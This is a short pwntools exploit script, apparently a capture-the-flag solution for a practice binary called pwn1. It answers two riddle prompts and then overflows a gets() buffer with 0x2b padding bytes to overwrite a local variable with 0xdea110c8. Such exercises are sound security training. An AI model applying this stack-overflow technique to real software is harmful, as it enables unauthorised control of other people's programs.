# Import pwntools
from pwn import *

# Establish the target process
target = process('./pwn1')

# Make the payload
payload = ""
payload += b"\x00"*0x2b # Padding to `local_18`
payload += p32(0xdea110c8) # the value we will overwrite local_18 with, in little endian

# Send the strings to reach the gets call
target.sendline("Sir Lancelot of Camelot")
target.sendline("To seek the Holy Grail.")

# Send the payload
target.sendline(payload)

target.interactive()
